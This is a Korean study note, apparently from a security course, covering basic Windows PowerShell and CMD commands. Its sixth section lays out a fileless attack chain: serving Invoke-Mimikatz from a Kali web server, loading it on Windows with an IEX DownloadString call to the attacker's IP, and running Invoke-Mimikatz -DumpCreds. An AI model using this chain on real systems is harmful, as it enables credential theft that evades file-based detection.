# 윈도우 파워쉘 명령어

## 1. 기본 명령어 (Cmdlet)
- `<동사>-<명사>` 형태로 구성
- 예시
  - `Get-Content` : 파일 내용을 출력 (리눅스의 `cat`과 유사)
  - `Set-Date` : 시스템 날짜 설정
- 도움말 보기
  - `Get-Help -Detailed <명령어>` : 상세 도움말
  - `Get-Help -Examples <명령어>` : 명령어 예제
- 자주 쓰는 명령어
  - `hostname` : 호스트 이름 확인
  - `whoami` : 현재 사용자 확인

## 2. 별명(Alias)
- 명령어 별명으로 간단히 사용 가능
  - 예: `Get-Content == cat`
- 리눅스 사용자들이 익숙하게 사용 가능
- `cd` 별명 확인: `Get-Alias cd`

## 3. 스크립트 실행
- 확장자: `.ps1`, `.psd`, `.psm` 등
- 직접 실행 가능
- 메모리상에 스크립트 로드 후 함수 사용 가능
- 인-메모리 실행(In-Memory Execution) 지원
- "Fileless" (파일리스) 악성코드 관련

## 4. 시스템 명령어 및 예시
- `systeminfo` : 시스템 정보 표시
- `ls -Force` : 숨김 파일 포함 모든 파일 및 폴더 표시
- `echo "Hello"` : 텍스트 출력
- `Get-Process` : 실행 중인 프로세스 목록 표시
- `Get-Process | Where-Object { $_.ProcessName -eq "explorer" }` : explorer 프로세스만 필터링 표시

## 5. 파일 및 디렉토리 작업
- `Cat -First 2 ./test.txt` : 파일의 첫 2줄 출력
- `Cat -Last 2 ./test.txt` : 파일의 마지막 2줄 출력
- `mv ./test.txt test2.txt` : 파일 이름 변경 또는 이동

## 6. 인 메모리 실행 방법
**Kali Linux 준비**
-`wget https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1` : 인 메모리 실행 프로세스 준비
-`python3 -m http.server 80` : python 웹 서버 START
**Windows**
- `IEX(New-Object Net.Webclient).DownloadString('http://KaliLinuxIP/Invoke-Mimikatz.ps1')`: 칼리리눅스의 웹 서버로, 인 메모리 실행 프로세스 다운로드
- `Get-Help Invoke-Mimikatz`
- `Invoke-Mimikatz -DumpCreds`

---

# 윈도우 CMD 명령어

## 1. 시스템/정보 확인
- `whoami` : 현재 로그인한 사용자 이름 표시
- `whoami/priv` : 현재 로그인한 사용자의 권한 표시
- `net user <유저이름>` : 유저의 다양한 정보 확인
- `hostname` : 컴퓨터 이름 표시
- `ipconfig` : 네트워크 구성 정보 표시
- `systeminfo` : 시스템 정보 표시
- `tasklist` : 실행 중인 프로세스 목록 표시
- `taskkill /PID <프로세스ID>` : 프로세스 종료
- `shutdown /s` : 시스템 종료
- `shutdown /r` : 시스템 재시작

## 2. 디렉토리/파일 탐색 및 관리
- `dir` : 현재 디렉토리 파일/폴더 목록 표시 (리눅스 `ls`와 유사)
- `dir /S` : 하위 디렉토리 포함 모든 파일/폴더 목록 표시
- `cd` : 디렉토리 변경
- `cls` : 화면 지우기
- `mkdir <폴더명>` : 새 디렉토리 생성
- `rmdir <폴더명>` : 디렉토리 삭제
- `copy <원본> <대상>` : 파일 복사
- `move <원본> <대상>` : 파일 이동 또는 이름 변경
- `del <파일명>` : 파일 삭제

## 3. 파일 내용 및 출력
- `echo Hello` : 문자열 출력
- `type test.txt` : 텍스트 파일 내용 출력 (리눅스 `cat`과 유사)

## 4. 명령어 도움말
- `<명령어> /?` : 명령어 사용법 및 옵션 확인

---
